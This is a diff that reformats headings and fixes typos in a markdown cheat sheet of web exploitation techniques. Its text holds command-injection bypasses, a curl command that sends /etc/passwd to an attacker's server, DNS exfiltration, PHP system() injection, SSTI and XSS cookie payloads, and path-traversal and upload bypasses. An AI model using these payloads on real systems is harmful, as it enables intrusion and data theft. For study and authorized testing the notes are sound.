@@ -7,18 +7,18 @@
   - [Web Exploitation](#web-exploitation)
     - [Start Hack](#start-hack)
     - [Techniques](#techniques)
-    - [Command Injection](#command-injection)
-      - [Useful commands](#useful-commands)
-      - [Out of band in OS command injection](#out-of-band-in-os-command-injection)
-        - [`curl`](#curl)
-        - [`ping` and `dig`](#ping-and-dig)
-    - [Code Injection](#code-injection)
-    - [Server Side Template Injection](#server-side-template-injection)
-    - [XSS](#xss)
-      - [DOM-Based](#dom-based)
-    - [Open Redirect](#open-redirect)
-    - [Path Traversal](#path-traversal)
-    - [File Upload](#file-upload)
+  - [Command Injection](#command-injection)
+    - [Useful commands](#useful-commands)
+    - [Out of band in OS command injection](#out-of-band-in-os-command-injection)
+      - [`curl`](#curl)
+      - [`ping` and `dig`](#ping-and-dig)
+  - [Code Injection](#code-injection)
+  - [Server Side Template Injection](#server-side-template-injection)
+  - [XSS](#xss)
+    - [DOM-Based](#dom-based)
+  - [Open Redirect](#open-redirect)
+  - [Path Traversal](#path-traversal)
+  - [File Upload](#file-upload)
   - [Recon](#recon)
   - [Handwrite Notes](#handwrite-notes)
 
@@ -40,7 +40,7 @@
 | HTTP request   | Use hex or encode URL                                            |
 | CORS           | If enabled, the best vulnerability                               |
 
-### Command Injection
+## Command Injection
 
 | Key                        | Description                                                 |
 | -------------------------- | ----------------------------------------------------------- |
@@ -52,9 +52,9 @@
 | `$ ping 127.0.0.1;ls -c 1` | Inject `ls; -c 1` or `ls # -c 1` or `ls %23 -c 1` to bypass |
 
 **No result:** what to do if we can not get the command result in response? Use the `sleep 20` command 
-to find whether it has vulnerabilty or not
+to find whether it has vulnerability or not
 
-#### Useful commands
+### Useful commands
 When you have identified an OS command injection vulnerability, it is generally useful to execute some initial commands to obtain information about the system that you have compromised. Below is a summary of some commands that are useful on Linux and Windows platforms:
 
 | Purpose of command    | Linux       | Windows       |
@@ -65,9 +65,9 @@ When you have identified an OS command injection vulnerability, it is generally 
 | Network connections   | netstat -an | netstat -an   |
 | Running processes     | ps -ef      | tasklist      |
 
-#### Out of band in OS command injection
+### Out of band in OS command injection
 
-##### `curl`
+#### `curl`
 
 1. Run a server in hacker's computer (better to bind it to `80` or `443` or `53` port)
 2. Inject these commands: 
@@ -76,11 +76,11 @@ When you have identified an OS command injection vulnerability, it is generally 
     - to send file, use this command `$ curl <addr> -d @/etc/passwd`
 3. See the logs in the server
 
-##### `ping` and `dig`
+#### `ping` and `dig`
 
 Sometimes the HTTP protocol is not allowed, so we can use `ping` or `dig` to send data to the server. The attacker can create a DNS server to receive the data.
 
-### Code Injection
+## Code Injection
 
 The `eval("print (2 + 2);")` function in PHP runs a code
 
@@ -92,13 +92,13 @@ The `eval("print (2 + 2);")` function in PHP runs a code
     - e.g. `system($_GET[v])`
 
 
-### Server Side Template Injection
+## Server Side Template Injection
 
-- Tool for this volnerability: [tplmap][1]
+- Tool for this vulnerability: [tplmap][1]
 - Input these: `{2*2}` or `{`
 - **exploit:** for PHP and Smarty engine, `{php}phpinfo(){/php}`
 
-### XSS
+## XSS
 
 Check these payloads:
 
@@ -112,7 +112,7 @@ Types of XSS:
 - Stored
 - DOM-based: e.g. `<script>document.write(document.cookie)</script>`
 
-#### DOM-Based
+### DOM-Based
 
 DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, 
 and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. The most common source for DOM 
@@ -122,13 +122,13 @@ to a vulnerable page with a payload in the query string and fragment portions of
 use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't 
 work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript.
 
-### Open Redirect
+## Open Redirect
 
 - Header
 - Redirect meta tag in HTML
 - `window.location` in JavaScript
 
-### Path Traversal
+## Path Traversal
 
 **Pattern:** www.stuff.com/?page=index.php
 
@@ -137,7 +137,7 @@ work for DOM XSS testing because it doesn't take account of changes that have be
 - `../../image.jpg` -> `image.jpg`: The WAF is Replacing the `../`. How to bypass? `....//....//....//etc/passwd `
 - The server is concating the extension (e.x. `.jpg`): `/etc/passwd` -> `/etc/passwd.jpg`. How to bypass? Use null byte `%00` in PHP. `/etc/passwd%00.jpg` This will ignore the extension.
 
-### File Upload
+## File Upload
 
 - Change the file extension in the request then put the file. Run it with http request and pass parameters.
 - Maybe the back-end is checking the content-type. Just change the file extension.
